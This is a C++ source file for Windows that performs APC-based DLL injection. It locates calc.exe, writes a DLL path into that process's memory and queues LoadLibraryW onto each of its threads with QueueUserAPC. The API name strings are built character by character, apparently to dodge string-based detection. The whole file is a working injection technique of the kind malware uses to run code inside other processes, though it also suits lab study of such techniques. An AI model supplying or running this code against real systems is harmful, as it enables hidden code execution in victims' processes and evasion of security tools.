#include <windows.h>
#include <TlHelp32.h>
#include <vector>

using std::vector;

bool FindProcess(PCWSTR exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
                THREADENTRY32 te = { sizeof(te) };
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

void main()
{
	DWORD pid;
	vector<DWORD> tids;
	if (FindProcess(L"calc.exe", pid, tids)) 
	{
		printf("OpenProcess\n");
		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
		printf("VirtualAllocEx\n");
		auto p = ::VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		wchar_t buffer[] = L"c:\\test\\testdll.dll";
		printf("WriteProcessMemory\n");
		::WriteProcessMemory(hProcess, p, buffer, sizeof(buffer), nullptr);

		WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };
		CHAR strLoadLibraryW[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };


		for (const auto& tid : tids) 
		{
			printf("OpenThread\n");
			HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
			if (hThread) 
			{
				printf("GetProcAddress\n");
			//	::QueueUserAPC((PAPCFUNC)::GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW"), hThread, (ULONG_PTR)p);
				::QueueUserAPC((PAPCFUNC)::GetProcAddress(GetModuleHandle(strKernel32),strLoadLibraryW), hThread, (ULONG_PTR)p);

			
			}
		}
		printf("VirtualFreeEx\n");
		::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
	}
}
